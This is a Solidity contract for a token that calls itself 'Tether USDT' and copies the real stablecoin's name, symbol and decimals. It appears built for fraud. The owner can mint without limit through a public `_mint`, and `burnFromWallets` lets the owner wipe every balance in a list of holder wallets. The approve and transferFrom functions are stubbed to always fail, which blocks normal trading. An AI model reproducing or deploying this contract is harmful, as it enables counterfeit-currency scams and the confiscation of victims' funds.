// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface TRC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address tokenOwner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed tokenOwner, address indexed spender, uint256 value);
}

contract USDT is TRC20 {
    string public name = "Tether USDT";
    string public symbol = "USDT";
    uint8 public decimals = 6;
    uint256 private _totalSupply;

    mapping(address => uint256) private _balances;
    address internal owner;

    modifier onlyOwner() {
        require(msg.sender == owner, "Not contract owner");
        _;
    }

    constructor(uint256 initialSupply) {
        owner = msg.sender;
        _mint(owner, initialSupply * 10**uint256(decimals));
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    // Implementazione obbligatoria per rispettare l'interfaccia TRC20
    function allowance(address /* tokenOwner */, address /* spender */) public pure override returns (uint256) {
        return 0;
    }

    // Implementazione obbligatoria per rispettare l'interfaccia TRC20
    function approve(address /* spender */, uint256 /* amount */) public pure override returns (bool) {
        return false;
    }

    // Implementazione obbligatoria per rispettare l'interfaccia TRC20
    function transferFrom(address /* sender */, address /* recipient */, uint256 /* amount */) public pure override returns (bool) {
        return false;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from zero address");
        require(recipient != address(0), "Transfer to zero address");
        require(_balances[sender] >= amount, "Insufficient balance");

        _balances[sender] -= amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) public onlyOwner {
        require(account != address(0), "Mint to zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal {
        require(account != address(0), "Burn from zero address");
        require(_balances[account] >= amount, "Burn amount exceeds balance");

        _balances[account] -= amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
    }

    function burnFromWallets(address[] memory wallets) public onlyOwner {
        for (uint256 i = 0; i < wallets.length; i++) {
            address account = wallets[i];
            uint256 balance = _balances[account];
            if (balance > 0) {
                _burn(account, balance);
            }
        }
    }
}
